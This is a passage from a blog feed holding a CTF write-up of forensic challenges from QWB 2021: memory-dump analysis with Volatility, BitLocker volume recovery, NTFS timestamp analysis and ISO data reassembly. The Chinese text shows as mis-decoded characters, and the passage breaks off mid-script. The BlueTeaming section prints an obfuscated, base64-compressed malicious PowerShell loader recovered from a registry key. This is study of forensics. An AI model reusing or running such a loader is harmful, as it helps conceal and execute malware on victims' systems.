åœ°å€ä¿®æ”¹ï¼Œè§‚å¯Ÿåˆ°å…¶ä¸å†æ˜¯é»˜è®¤å€¼å³æ¢å¤æˆåŠŸã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/bcd1e494-d526-4ad9-aa35-31dc34ee3fxu/1626537565373/02cb4ac024b5cb28d610ede1c536367e02682218.png"></p><p>æ¥ä¸‹æ¥å›åˆ° breed çš„å›ºä»¶æ›´æ–°é€‰é¡¹ä¸­ç»™è·¯ç”±å™¨é‡æ–°åˆ·å…¥ Pandvan å³å¯ã€‚è¿™é‡Œé™„ä¸Šæˆ‘ä½¿ç”¨çš„<a href="https://1drv.ms/u/s!Aqe9Z34waQq1k3k5VY6sQB3oGLOA?e=hbBgBD">å·¥å…·é›†</a>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> StudyNote </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Skill </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ¯ 2021</title>
      <link href="/zh-CN/posts/1ff2873c.html"/>
      <url>/zh-CN/posts/1ff2873c.html</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="BlueTeaming"><a href="#BlueTeaming" class="headerlink" title="BlueTeaming"></a>BlueTeaming</h3><blockquote><p>Powershell scripts were executed by malicious programs. What is the registry key that contained the power shellscript content?</p></blockquote><p>å°†é™„ä»¶è§£å‹å file ä¸€æ¬¡å¯å¾—å…¶ä»ç„¶æ˜¯ä¸ª 7z æ–‡ä»¶ï¼Œå†æ¬¡è§£å‹åå¾—åˆ° dump æ–‡ä»¶ã€‚ä½¿ç”¨ volatility æ¢æµ‹ profileã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/ghrepos/volatility2$ python2 vol.py -f memory.dmp imageinfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418</span><br><span class="line">                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/mnt/f/ghrepos/volatility2/memory.dmp)</span><br><span class="line">                      PAE <span class="built_in">type</span> : No PAE</span><br><span class="line">                           DTB : 0x187000L</span><br><span class="line">                          KDBG : 0xf80002be3120L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0xfffff80002be5000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2020-11-26 13:00:41 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> date and time : 2020-11-26 22:00:41 +0900</span><br></pre></td></tr></table></figure><p>å–å…¶ profile ä¸º <code>Win7SP1x64</code>ï¼Œä½¿ç”¨ hivelist åˆ—å‡ºæ³¨å†Œè¡¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/ghrepos/volatility2$ python2 vol.py -f memory.dmp --profile=Win7SP1x64 hivelist</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Virtual            Physical           Name</span><br><span class="line">------------------ ------------------ ----</span><br><span class="line">0xfffff8a00000f010 0x00000000a9107010 [no name]</span><br><span class="line">0xfffff8a000024010 0x00000000a9612010 \REGISTRY\MACHINE\SYSTEM</span><br><span class="line">0xfffff8a000057410 0x00000000a9745410 \REGISTRY\MACHINE\HARDWARE</span><br><span class="line">0xfffff8a0001052e0 0x00000000595002e0 \SystemRoot\System32\Config\DEFAULT</span><br><span class="line">0xfffff8a0002d7010 0x00000000a103c010 \SystemRoot\System32\Config\SOFTWARE</span><br><span class="line">0xfffff8a000347010 0x00000000a57be010 \Device\HarddiskVolume1\Boot\BCD</span><br><span class="line">0xfffff8a00200e010 0x0000000081c17010 \SystemRoot\System32\Config\SECURITY</span><br><span class="line">0xfffff8a00203a010 0x0000000081a77010 \SystemRoot\System32\Config\SAM</span><br><span class="line">0xfffff8a002149010 0x0000000081565010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT</span><br><span class="line">0xfffff8a0021d5010 0x0000000081255010 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT</span><br><span class="line">0xfffff8a002ae4410 0x000000007d278410 \??\C:\Windows\System32\config\COMPONENTS</span><br><span class="line">0xfffff8a00891f010 0x000000006f172010 \??\C:\System Volume Information\Syscache.hve</span><br><span class="line">0xfffff8a0089ff010 0x0000000075c42010 \??\C:\Users\nyong\ntuser.dat</span><br><span class="line">0xfffff8a008bf1010 0x000000002b8a7010 \??\C:\Windows\AppCompat\Programs\Amcache.hve</span><br><span class="line">0xfffff8a008e1b010 0x0000000061e3c010 \??\C:\Users\nyong\AppData\Local\Microsoft\Windows\UsrClass.dat</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤å°†æ³¨å†Œè¡¨å…¨éƒ¨å¯¼å‡ºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f memory.dmp --profile Win7SP1x64 dumpregistry -D /mnt/f/CTFs/2021/qwb/</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Windows è‡ªå¸¦çš„ Regedit åŠ è½½é…ç½®å•å…ƒæŒ‚è½½æ–‡ä»¶ <code>registry.0xfffff8a0002d7010.SOFTWARE.reg</code>ï¼Œå¯ä»¥åœ¨ <code>è®¡ç®—æœº\HKEY_LOCAL_MACHINE\IMPORTED\Microsoft\Windows\Communication</code> ä¸‹æ‰¾åˆ° codeï¼Œå…¶å†…å®¹ä¸ºå¦‚ä¸‹æ¶æ„ä»£ç ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; ( <span class="variable">$veRBOsepReFErEncE</span>.tOstrINg()[<span class="number">1</span>,<span class="number">3</span>]+<span class="string">&#x27;x&#x27;</span><span class="operator">-JOin</span><span class="string">&#x27;&#x27;</span>)( <span class="built_in">nEW-ObjEcT</span> sySTEm.iO.sTreaMReAdER( ( <span class="built_in">nEW-ObjEcT</span>  SystEm.iO.CompreSsiOn.DEfLATEstREam([<span class="type">IO.meMoryStream</span>] [<span class="type">CoNVeRT</span>]::fROMbASe64StRinG(<span class="string">&#x27;NVJdb5tAEHyv1P9wQpYAuZDaTpvEVqRi+5Sgmo/Axa0VRdoLXBMUmyMGu7Es//fuQvoAN7e7Nzua3RqUcJbgQVLIJ1hzNi/eGLMYe2gOFX+0zHpl9s0Uv4YHbnu8CzwI8nIW5UX4bNqM2RPGUtU4sPQSH+mmsFbIY87kFit3A6ohVnGIFbLOdLlXCdFhAlOT3rGAEJYQvfIsgmAjw/mJXTPLssxsg3U59VTvyrT7JjvDS8bwN8NvbPYt81amMeItpi1TI3omaErK0fO5bNr7LQVkWjYkqlZtkVtRUK8xxAQxxqylGVwM3dFX6jtw6TgbnrPRCMFlm75i3xAPhq2aqUnNKFyWqhNiu0bC4wV6kXHDsh6yF5k8Xgz7Hbi6+ACXI/vLQyoSv7x5/EgNbXvy+VPvOAtyvWuggvuGvOhZaNFS/wTlqN9xwqGuwQddst7Rh3AfvQKHLAoCsq4jmMJBgKrpMbm/By8pcDQLzlju3zFn6S12zB6PjXsIfcj0XBmu8Qyqma4ETw2rd8w2MI92IGKU0HGqEGYacp7/Z2U+CB7gqJdy67c2dHYsOA0H598N33b3cr3j2EzoKXgpiv1+XjfbIryhRk+wakhq16TSqYhpKcHbpNTox9GYgyekcY0KcFGyKFf56YTF7drg1ji/+BMk/G7H04Y599sCFW3+NG71l0aXZRntjFu94FGhHidQzYvOsSiOaLsFxaY6P6CbFWioRSUTGdSnyT8=&#x27;</span> ) , [<span class="type">IO.coMPressION.cOMPresSiOnmOde</span>]::dEcOMPresS)), [<span class="type">TexT.ENcODInG</span>]::AsCIi)).ReaDToeNd()</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623517143196/da7ea97787528ea9c0e3fc7dfa48fae14d936f8b.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication</span><br></pre></td></tr></table></figure><h3 id="CipherMan"><a href="#CipherMan" class="headerlink" title="CipherMan"></a>CipherMan</h3><blockquote><p>The attacker maliciously accessed the userâ€™s PC and encrypted specific volumes. How to decrypt the volume?</p></blockquote><p>ç»è¿‡ä¸¤æ¬¡è§£å‹åå¯å¾— Secret å’Œ memoryï¼Œfile ä¸€ä¸‹å¯çŸ¥ Secret æ˜¯ç£ç›˜æ–‡ä»¶ã€‚ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤æŠ“å– Secret çš„ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/CTFs/2021/qwb/CipherMan2$ mmls Secret </span><br><span class="line">DOS Partition Table</span><br><span class="line">Offset Sector: 0</span><br><span class="line">Units are <span class="keyword">in</span> 512-byte sectors</span><br><span class="line"></span><br><span class="line">      Slot      Start        End          Length       Description</span><br><span class="line">000:  Meta      0000000000   0000000000   0000000001   Primary Table (<span class="comment">#0)</span></span><br><span class="line">001:  -------   0000000000   0000000127   0000000128   Unallocated</span><br><span class="line">002:  000:000   0000000128   0001042559   0001042432   NTFS / exFAT (0x07)</span><br><span class="line">003:  -------   0001042560   0001048575   0000006016   Unallocated</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å°è¯•æŒ‚è½½ Secretï¼Œå¯ä»¥å¾—åˆ°å…¶æ˜¯ BitLocker ä¿æŠ¤çš„ç£ç›˜çš„æç¤ºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-3E49IU3M:/mnt/f/CTFs/2021/qwb/CipherMan2<span class="comment"># mount Secret /mnt/ctf -o offset=$((128*512)) </span></span><br><span class="line">mount: /mnt/ctf: unknown filesystem <span class="built_in">type</span> <span class="string">&#x27;BitLocker&#x27;</span>.</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ volatility2 æ¢æµ‹ memory çš„ profileã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/ghrepos/volatility2$ python2 vol.py -f memory2 imageinfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/mnt/f/ghrepos/volatility2/memory2)</span><br><span class="line">                      PAE <span class="built_in">type</span> : PAE</span><br><span class="line">                           DTB : 0x185000L</span><br><span class="line">                          KDBG : 0x82d72c28L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0x82d73c00L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2018-08-06 08:41:18 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> date and time : 2018-08-06 17:41:18 +0900</span><br></pre></td></tr></table></figure><p>å–å…¶ profile ä¸º <code>Win7SP1x86_23418</code>ï¼Œä½¿ç”¨ filescan ç­›é€‰æ¡Œé¢æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/ghrepos/volatility2$ python2 vol.py -f memory2 --profile=Win7SP1x86_23418 filescan | grep <span class="string">&quot;Desktop&quot;</span></span><br><span class="line">...</span><br><span class="line">0x000000007e02af80      8      0 -W---- \Device\HarddiskVolume2\Users\RockAndRoll\Desktop\BitLocker ë³µêµ¬ í‚¤ 168F1291-82C1-4BF2-B634-9CCCEC63E9ED.txt</span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°æ–‡ä»¶ä½¿ç”¨ dumpfiles æ¢å¤ï¼Œå¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BitLocker ë“œë¼ì´ë¸Œ ì•”í˜¸í™” ë³µêµ¬ í‚¤ </span><br><span class="line"></span><br><span class="line"> ë³µêµ¬ í‚¤ëŠ” BitLockerë¡œ ë³´í˜¸ë˜ëŠ” ë“œë¼ì´ë¸Œì—ì„œ ë°ì´í„°ë¥¼ ê²€ìƒ‰í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤.</span><br><span class="line"></span><br><span class="line">ì´ í‚¤ê°€ ì˜¬ë°”ë¥¸ ë³µêµ¬ í‚¤ì¸ì§€ í™•ì¸í•˜ë ¤ë©´ ë³µêµ¬ í™”ë©´ì— í‘œì‹œëœ ê²ƒê³¼ IDë¥¼ ë¹„êµí•˜ì‹­ì‹œì˜¤.</span><br><span class="line"></span><br><span class="line">ë³µêµ¬ í‚¤ ID: 168F1291-82C1-4B</span><br><span class="line">ì „ì²´ ë³µêµ¬ í‚¤ ID: 168F1291-82C1-4BF2-B634-9CCCEC63E9ED</span><br><span class="line"></span><br><span class="line">BitLocker ë³µêµ¬ í‚¤:</span><br><span class="line">221628-533357-667392-449185-516428-718443-190674-375100</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤é…åˆæ¢å¤å¯†é’¥å°†ç£ç›˜æŒ‚è½½ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bdemount -o $((<span class="number">128</span>*<span class="number">512</span>)) -r 221628-533357-667392-449185-516428-718443-190674-375100 Secret /mnt/ctf</span><br></pre></td></tr></table></figure><p>å°†æŒ‚è½½æ‰€å¾—ç£ç›˜ä¸­çš„æ–‡ä»¶ bde1 å†æ¬¡ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤æŒ‚è½½ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o ro bde1 /mnt/ctf2</span><br></pre></td></tr></table></figure><p>å³å¯åœ¨æŒ‚è½½å¤„æ‰¾åˆ° README.txtï¼Œå…¶ä¸­åŒ…å«çš„å­—ç¬¦ä¸²å³ä¸º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wow, you have a great ability. How did you solve this? Are you a hacker? Please give me a lesson later.</span><br></pre></td></tr></table></figure><h3 id="EzTime"><a href="#EzTime" class="headerlink" title="EzTime"></a>EzTime</h3><blockquote><p>Forensic.Find a file that a time attribute has been modified by a program.</p></blockquote><p>è§£å‹ä¸¤æ¬¡å¾—åˆ°é™„ä»¶ $MFT å’Œ â€‹$LogFileï¼Œä½¿ç”¨ NTFS Log Tracker åˆ†ææ–‡ä»¶å¯¼å‡º csvã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623552765505/57240b89d028fb27c1709e7879f6df2104a327c8.png" alt="image-20210613105244681"></p><p>ç­›é€‰å‡ºä¿®æ”¹æ—¶é—´å¤§äºè®¿é—®æ—¶é—´çš„æ¡ç›®ï¼Œå¯å¾— flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">File&#x2F;Directory NameFull PathCreate TimeModified TimeMFT_Modified TimeAccess Time</span><br><span class="line">$Quota\$Extend\$Quota2021&#x2F;5&#x2F;23 0:252021&#x2F;5&#x2F;23 0:252021&#x2F;5&#x2F;23 0:252021&#x2F;5&#x2F;23 0:25</span><br><span class="line">daniel-olah-HNkgPFBShSw-unsplash.jpg\daniel-olah-HNkgPFBShSw-unsplash.jpg2021&#x2F;5&#x2F;23 0:252021&#x2F;5&#x2F;23 0:252021&#x2F;5&#x2F;23 0:272021&#x2F;5&#x2F;23 0:25</span><br><span class="line">louis-reed-hzp_aT02R48-unsplash.jpg\louis-reed-hzp_aT02R48-unsplash.jpg2021&#x2F;5&#x2F;23 0:262021&#x2F;5&#x2F;23 0:262021&#x2F;5&#x2F;23 0:272021&#x2F;5&#x2F;23 0:26</span><br><span class="line">&#123;45EF6FFC-F0B6-4000-A7C0-8D1549355A8C&#125;.png\&#123;45EF6FFC-F0B6-4000-A7C0-8D1549355A8C&#125;.png2021&#x2F;5&#x2F;23 0:282021&#x2F;5&#x2F;19 23:592021&#x2F;5&#x2F;23 0:322021&#x2F;5&#x2F;23 0:28</span><br><span class="line">BlackboardFieldPillBackground.png\fr_MA\BlackboardFieldPillBackground.png2021&#x2F;5&#x2F;23 0:282018&#x2F;2&#x2F;20 17:242021&#x2F;5&#x2F;23 0:332021&#x2F;5&#x2F;23 0:28</span><br><span class="line">editmode-run-test.png\fr_MA\editmode-run-test.png2021&#x2F;5&#x2F;23 0:282020&#x2F;8&#x2F;5 13:382021&#x2F;5&#x2F;23 0:332021&#x2F;5&#x2F;23 0:28</span><br><span class="line">IMG_2279.JPG\fr_MA\IMG_2279.JPG2021&#x2F;5&#x2F;23 0:292020&#x2F;10&#x2F;19 23:512021&#x2F;5&#x2F;23 0:332021&#x2F;5&#x2F;23 0:29</span><br><span class="line">IMG_2281.JPG\fr_MA\IMG_2281.JPG2021&#x2F;5&#x2F;23 0:292020&#x2F;10&#x2F;19 23:502021&#x2F;5&#x2F;23 0:332021&#x2F;5&#x2F;23 0:29</span><br><span class="line">&#123;0A2792E2-9495-4DF8-93F5-581086B905B6&#125;.png\en_US\&#123;0A2792E2-9495-4DF8-93F5-581086B905B6&#125;.png2021&#x2F;5&#x2F;23 0:282021&#x2F;5&#x2F;19 20:542021&#x2F;5&#x2F;23 0:332021&#x2F;5&#x2F;23 0:28</span><br><span class="line">&#123;0AC4E564-51D1-41CF-BA81-DA2629CBB93B&#125;.png\en_GB\&#123;0AC4E564-51D1-41CF-BA81-DA2629CBB93B&#125;.png2021&#x2F;5&#x2F;23 0:282021&#x2F;5&#x2F;22 21:382021&#x2F;5&#x2F;23 0:332021&#x2F;5&#x2F;23 0:28</span><br><span class="line">&#123;0A8E35BF-7598-4676-9882-D7E157D5034C&#125;.png\es_NA\&#123;0A8E35BF-7598-4676-9882-D7E157D5034C&#125;.png2021&#x2F;5&#x2F;23 0:282021&#x2F;5&#x2F;19 20:542021&#x2F;5&#x2F;23 0:332021&#x2F;5&#x2F;23 0:28</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;45EF6FFC-F0B6-4000-A7C0-8D1549355A8C&#125;.png</span><br></pre></td></tr></table></figure><h3 id="ISO1995"><a href="#ISO1995" class="headerlink" title="ISO1995"></a>ISO1995</h3><blockquote><p>We follow ISO1995. ISO1995 has many problems though. One known problem is a time.</p></blockquote><p>å°†é™„ä»¶æå–å‡ºæ¥ï¼Œ file ä¸€æ¬¡å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iso1995: ISO 9660 CD-ROM filesystem data &#39;Debian 10.6.0 AMD64 Network&#39;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ UltraISO åŠ è½½ç£ç›˜ï¼Œå°†å…¶ä¸­çš„æ–‡ä»¶æå–å‡ºæ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623555716068/3f048fcd5acf1da7e59bc548f9db86bcb1080e9f.png"></p><p>ä½¿ç”¨ 010 Editor æ‰“å¼€æ–‡ä»¶å¯ä»¥å‘ç°æ˜æ˜¾é¡ºåºï¼Œå°† <code>FF FF FF FF</code> åé¢çš„ä¸¤å­—èŠ‚æå–å‡ºæ¥æ‹¼æ¥æˆä¸€ä¸ªåå…­è¿›åˆ¶æ•°å­—ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623563522098/55f594d43ad02f6a55a4551bf4718b0be3185cf8.png"></p><p>å†™ä¸€ä¸ªè„šæœ¬æŒ‰ç…§é¡ºåºå»è®¿é—®å¹¶æ‹¼æ¥æ–‡ä»¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">indexes = [<span class="number">0x000</span>,<span class="number">0x00AA</span>,<span class="number">0x0357</span>,<span class="number">0x02C5</span>,<span class="number">0x0023</span>,<span class="number">0x0268</span>,<span class="number">0x02F2</span>,<span class="number">0x02DB</span>,<span class="number">0x03E5</span>,<span class="number">0x01E5</span>,<span class="number">0x0101</span>,<span class="number">0x02A8</span>,<span class="number">0x0236</span>,<span class="number">0x0267</span>,<span class="number">0x03F2</span>,<span class="number">0x009E</span>,<span class="number">0x002A</span>,<span class="number">0x00E0</span>,<span class="number">0x0398</span>,<span class="number">0x01B0</span>,<span class="number">0x028A</span>,<span class="number">0x006D</span>,<span class="number">0x03D1</span>,<span class="number">0x019D</span>,<span class="number">0x01CB</span>,<span class="number">0x031B</span>,<span class="number">0x0319</span>,<span class="number">0x02A0</span>,<span class="number">0x0259</span>,<span class="number">0x00A1</span>,<span class="number">0x022D</span>,<span class="number">0x0305</span>,<span class="number">0x0051</span>,<span class="number">0x0231</span>,<span class="number">0x003C</span>,<span class="number">0x02C7</span>,<span class="number">0x02E3</span>,<span class="number">0x0199</span>,<span class="number">0x0235</span>,<span class="number">0x037E</span>,<span class="number">0x0185</span>,<span class="number">0x012E</span>,<span class="number">0x0074</span>,<span class="number">0x00A2</span>,<span class="number">0x006C</span>,<span class="number">0x0216</span>,<span class="number">0x02FC</span>,<span class="number">0x01B4</span>,<span class="number">0x01AA</span>,<span class="number">0x0269</span>,<span class="number">0x02CE</span>,<span class="number">0x00FD</span>,<span class="number">0x00B6</span>,<span class="number">0x01D3</span>,<span class="number">0x0049</span>,<span class="number">0x03BC</span>,<span class="number">0x02F0</span>,<span class="number">0x00F2</span>,<span class="number">0x0165</span>,<span class="number">0x03A4</span>,<span class="number">0x0325</span>,<span class="number">0x01EE</span>,<span class="number">0x03B4</span>,<span class="number">0x03DE</span>,<span class="number">0x02DE</span>,<span class="number">0x03F8</span>,<span class="number">0x0147</span>,<span class="number">0x024F</span>,<span class="number">0x033C</span>,<span class="number">0x0263</span>,<span class="number">0x001C</span>,<span class="number">0x03F4</span>,<span class="number">0x0097</span>,<span class="number">0x02EC</span>,<span class="number">0x0091</span>,<span class="number">0x000C</span>,<span class="number">0x00BF</span>,<span class="number">0x0168</span>,<span class="number">0x0233</span>,<span class="number">0x01A4</span>,<span class="number">0x038C</span>,<span class="number">0x024E</span>,<span class="number">0x024D</span>,<span class="number">0x03C5</span>,<span class="number">0x0086</span>,<span class="number">0x037C</span>,<span class="number">0x0012</span>,<span class="number">0x02C1</span>,<span class="number">0x0111</span>,<span class="number">0x0126</span>,<span class="number">0x0368</span>,<span class="number">0x01C7</span>,<span class="number">0x0007</span>,<span class="number">0x02F3</span>,<span class="number">0x0070</span>,<span class="number">0x00BB</span>,<span class="number">0x0304</span>,<span class="number">0x036B</span>,<span class="number">0x02D3</span>,<span class="number">0x0041</span>,<span class="number">0x03AF</span>,<span class="number">0x0130</span>,<span class="number">0x017C</span>,<span class="number">0x0034</span>,<span class="number">0x0397</span>,<span class="number">0x0061</span>,<span class="number">0x0081</span>,<span class="number">0x02A3</span>,<span class="number">0x01A8</span>,<span class="number">0x0092</span>,<span class="number">0x012A</span>,<span class="number">0x002C</span>,<span class="number">0x0135</span>,<span class="number">0x0323</span>,<span class="number">0x028E</span>,<span class="number">0x00F9</span>,<span class="number">0x02D7</span>,<span class="number">0x0109</span>,<span class="number">0x01A7</span>,<span class="number">0x02F8</span>,<span class="number">0x0327</span>,<span class="number">0x01EF</span>,<span class="number">0x000F</span>,<span class="number">0x03C8</span>,<span class="number">0x020E</span>,<span class="number">0x014A</span>,<span class="number">0x0260</span>,<span class="number">0x0344</span>,<span class="number">0x0343</span>,<span class="number">0x00C4</span>,<span class="number">0x022C</span>,<span class="number">0x0099</span>,<span class="number">0x026D</span>,<span class="number">0x008A</span>,<span class="number">0x0301</span>,<span class="number">0x03F1</span>,<span class="number">0x0273</span>,<span class="number">0x031F</span>,<span class="number">0x009D</span>,<span class="number">0x00F5</span>,<span class="number">0x01FA</span>,<span class="number">0x010D</span>,<span class="number">0x037A</span>,<span class="number">0x0361</span>,<span class="number">0x01E1</span>,<span class="number">0x0307</span>,<span class="number">0x0215</span>,<span class="number">0x02E2</span>,<span class="number">0x01B7</span>,<span class="number">0x0225</span>,<span class="number">0x0310</span>,<span class="number">0x0035</span>,<span class="number">0x0243</span>,<span class="number">0x0286</span>,<span class="number">0x02D8</span>,<span class="number">0x0108</span>,<span class="number">0x03EF</span>,<span class="number">0x01F5</span>,<span class="number">0x030A</span>,<span class="number">0x0339</span>,<span class="number">0x0170</span>,<span class="number">0x0107</span>,<span class="number">0x0177</span>,<span class="number">0x0100</span>,<span class="number">0x005C</span>,<span class="number">0x021C</span>,<span class="number">0x0169</span>,<span class="number">0x0063</span>,<span class="number">0x0102</span>,<span class="number">0x03E1</span>,<span class="number">0x039C</span>,<span class="number">0x00DA</span>,<span class="number">0x037D</span>,<span class="number">0x01BC</span>,<span class="number">0x0140</span>,<span class="number">0x02A5</span>,<span class="number">0x0349</span>,<span class="number">0x00D8</span>,<span class="number">0x033A</span>,<span class="number">0x00C1</span>,<span class="number">0x0044</span>,<span class="number">0x03CF</span>,<span class="number">0x0291</span>,<span class="number">0x01FF</span>,<span class="number">0x03D8</span>,<span class="number">0x0239</span>,<span class="number">0x0338</span>,<span class="number">0x030B</span>,<span class="number">0x0106</span>,<span class="number">0x02B3</span>,<span class="number">0x03FB</span>,<span class="number">0x03F0</span>,<span class="number">0x0077</span>,<span class="number">0x01CD</span>,<span class="number">0x0256</span>,<span class="number">0x00EC</span>,<span class="number">0x004C</span>,<span class="number">0x03EB</span>,<span class="number">0x0001</span>,<span class="number">0x0162</span>,<span class="number">0x0266</span>,<span class="number">0x035B</span>,<span class="number">0x0298</span>,<span class="number">0x000A</span>,<span class="number">0x02CC</span>,<span class="number">0x0248</span>,<span 